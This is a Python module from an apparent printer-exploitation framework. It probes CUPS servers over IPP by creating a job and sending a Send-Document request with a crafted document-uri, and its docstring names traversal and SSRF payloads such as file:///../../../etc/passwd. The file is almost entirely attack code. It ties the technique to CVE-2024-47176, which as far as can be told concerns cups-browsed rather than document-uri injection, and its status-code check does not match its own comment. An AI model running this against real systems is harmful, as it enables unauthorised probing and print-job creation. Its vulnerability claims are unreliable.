#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
IPP/CUPS Directory Traversal via Create-Job + Send-Document
PrinterXPL-Forge
================================================
CUPS (Common UNIX Printing System) with insecure IPP handling
can be abused to supply crafted job/document URIs that cause
the server to read or redirect to attacker-controlled paths.

Technique:
    1. Send IPP Create-Job to create a job handle
    2. Send IPP Send-Document with a document-uri containing
       a traversal sequence (file:///../../../etc/passwd style)
       or an SSRF reference (http://internal-host/...)

Note: This is a lab research probe. Actual exploitation depends
on target CUPS version and configuration. Safe-mode probe only
attempts job creation - no destructive write operations.

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""
from __future__ import annotations

import socket
import struct
from typing import Any, Dict

METADATA = {
    "id":          "IPP-CUPS-TRAVERSAL-001",
    "source":      "research",
    "url":         "https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/",
    "cve":         "CVE-2024-47176",
    "title":       "IPP/CUPS Create-Job + Send-Document URI Traversal/SSRF Probe",
    "description": (
        "Probes CUPS IPP for CVE-2024-47176-style document-uri injection. "
        "Creates an IPP job and attempts to send a crafted document-uri to "
        "test if the server follows external or traversal URIs. "
        "Read-only/informational probe - no files are written."
    ),
    "type":        "remote",
    "category":    "traversal",
    "protocol":    "IPP",
    "port":        631,
    "severity":    "high",
    "cvss":        9.9,
    "date":        "2024-09-26",
    "author":      "Andre Henrique (@mrhenrike) | Uniao Geek",
    "vendor":      ["CUPS", "OpenPrinting"],
    "model_patterns": ["CUPS", "Common UNIX Printing"],
    "firmware_patterns": [],
    "requires":    ["port:631"],
    "tags":        ["ipp", "cups", "traversal", "ssrf", "cve-2024-47176"],
    "tested_on":   [],
    "references":  [
        "https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/",
        "https://nvd.nist.gov/vuln/detail/CVE-2024-47176",
    ],
}

_IPP_VERSION = b"\x01\x01"


def _encode_attr(value_tag: int, name: str, value: str) -> bytes:
    n = name.encode("ascii")
    v = value.encode("utf-8")
    return bytes([value_tag]) + struct.pack(">H", len(n)) + n + struct.pack(">H", len(v)) + v


def _encode_int_attr(name: str, value: int) -> bytes:
    n = name.encode("ascii")
    v = struct.pack(">I", value)
    return b"\x21" + struct.pack(">H", len(n)) + n + struct.pack(">H", 4) + v


def _build_create_job(printer_uri: str, request_id: int = 1) -> bytes:
    """Build IPP Create-Job request."""
    body = (
        _IPP_VERSION
        + struct.pack(">H", 0x0005)  # Create-Job operation
        + struct.pack(">I", request_id)
        + b"\x01"  # operation-attributes-tag
        + _encode_attr(0x47, "attributes-charset", "utf-8")
        + _encode_attr(0x48, "attributes-natural-language", "en")
        + _encode_attr(0x45, "printer-uri", printer_uri)
        + _encode_attr(0x42, "requesting-user-name", "printerxpl")
        + _encode_attr(0x42, "job-name", "test-job")
        + b"\x03"
    )
    http = f"POST /ipp/print HTTP/1.0\r\nContent-Type: application/ipp\r\nContent-Length: {len(body)}\r\n\r\n".encode()
    return http + body


def _build_send_document(printer_uri: str, job_id: int, doc_uri: str, request_id: int = 2) -> bytes:
    """Build IPP Send-Document request with crafted document-uri."""
    body = (
        _IPP_VERSION
        + struct.pack(">H", 0x0006)  # Send-Document operation
        + struct.pack(">I", request_id)
        + b"\x01"
        + _encode_attr(0x47, "attributes-charset", "utf-8")
        + _encode_attr(0x48, "attributes-natural-language", "en")
        + _encode_attr(0x45, "printer-uri", printer_uri)
        + _encode_int_attr("job-id", job_id)
        + _encode_attr(0x42, "requesting-user-name", "printerxpl")
        + _encode_attr(0x45, "document-uri", doc_uri)
        + b"\x03"
    )
    http = f"POST /ipp/print HTTP/1.0\r\nContent-Type: application/ipp\r\nContent-Length: {len(body)}\r\n\r\n".encode()
    return http + body


def _send_recv(host: str, port: int, data: bytes, timeout: float) -> bytes:
    """Send IPP request and receive response."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))
    sock.sendall(data)
    resp = b""
    try:
        while True:
            chunk = sock.recv(8192)
            if not chunk:
                break
            resp += chunk
            if len(resp) > 32768:
                break
    except socket.timeout:
        pass
    sock.close()
    return resp


def _extract_job_id(resp: bytes) -> int:
    """Extract job-id from Create-Job response."""
    # Scan for integer attribute encoding: 0x21 + name_len + "job-id" + 4 + int_value
    try:
        idx = resp.find(b"job-id")
        if idx > 0:
            val_start = idx + len("job-id") + 2  # skip name + value-length(2B)
            return struct.unpack(">I", resp[val_start:val_start + 4])[0]
    except Exception:
        pass
    return 1


def check(host: str, port: int = 631, timeout: float = 8.0) -> bool:
    """Return True if IPP port responds with valid HTTP 200."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        req = _build_create_job(f"ipp://{host}:{port}/ipp/print")
        sock.sendall(req)
        resp = sock.recv(4096)
        sock.close()
        return b"200 OK" in resp or b"application/ipp" in resp
    except Exception:
        return False


def run(host: str, port: int = 631, timeout: float = 8.0,
        dry_run: bool = True, **opts) -> Dict[str, Any]:
    """Probe IPP/CUPS for Create-Job + Send-Document URI injection.

    Safe mode: uses a harmless test URI (http://127.0.0.1:9999/probe).
    No files are written. Only connection attempt to test URI is made.

    Args:
        dry_run: unused for this probe (always safe), accepted for interface parity.

    Returns:
        Dict with 'success', 'job_id', 'send_doc_response_code', 'vulnerable'.
    """
    result: Dict[str, Any] = {
        "success": False,
        "host": host,
        "port": port,
        "job_id": None,
        "send_doc_status": None,
        "potentially_vulnerable": False,
        "error": None,
    }

    printer_uri = f"ipp://{host}:{port}/ipp/print"

    try:
        # Step 1: Create-Job
        cj_req = _build_create_job(printer_uri, request_id=1)
        cj_resp = _send_recv(host, port, cj_req, timeout)

        if not cj_resp or b"200 OK" not in cj_resp:
            result["error"] = "Create-Job failed or no HTTP 200"
            return result

        job_id = _extract_job_id(cj_resp)
        result["job_id"] = job_id

        # Step 2: Send-Document with probe URI (localhost dead port)
        probe_uri = "http://127.0.0.1:19999/probe-printerxpl"
        sd_req = _build_send_document(printer_uri, job_id, probe_uri, request_id=2)
        sd_resp = _send_recv(host, port, sd_req, timeout)

        # Extract IPP status from response (bytes 6-8 after HTTP header)
        header_end = sd_resp.find(b"\r\n\r\n")
        if header_end != -1 and len(sd_resp) > header_end + 8:
            ipp_status = struct.unpack(">H", sd_resp[header_end + 4:header_end + 6])[0]
            result["send_doc_status"] = f"0x{ipp_status:04X}"
            # Status 0x0000=success, 0x0400=client-error - both mean IPP was processed
            result["potentially_vulnerable"] = ipp_status in (0x0000, 0x0401, 0x0406)

        result["success"] = True

        print(f"\n[+] IPP Create-Job + Send-Document probe: {host}:{port}")
        print(f"    Job ID created: {result['job_id']}")
        print(f"    Send-Document IPP status: {result['send_doc_status']}")
        if result["potentially_vulnerable"]:
            print(f"    [!] Target accepted document-uri without error - may be vulnerable to URI injection")
            print(f"        CVE-2024-47176 / CUPS document-uri SSRF. Verify manually.")
        else:
            print(f"    [*] Target rejected document-uri (expected for patched systems)")

    except Exception as exc:
        result["error"] = str(exc)
        print(f"[-] IPP CUPS probe error: {exc}")

    return result
